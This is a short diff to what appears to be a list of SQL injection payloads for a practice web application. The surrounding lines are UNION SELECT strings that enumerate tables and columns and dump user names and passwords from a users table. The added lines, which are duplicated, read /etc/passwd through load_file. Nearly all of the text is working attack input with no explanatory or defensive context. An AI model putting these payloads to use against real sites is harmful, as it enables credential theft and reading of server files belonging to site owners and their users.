@@ -6,3 +6,5 @@
 1' union select null,table_name from information_schema.tables where table_schema = 'users' #
 1' union select null,concat(0x0a,column_name) from information_schema.columns where table_name= 'users' #
 1' union select null,concat(first_name,0x0a,password) from users #
+1' union all select load_file('/etc/passwd'),null #
+1' union all select load_file('/etc/passwd'),null #
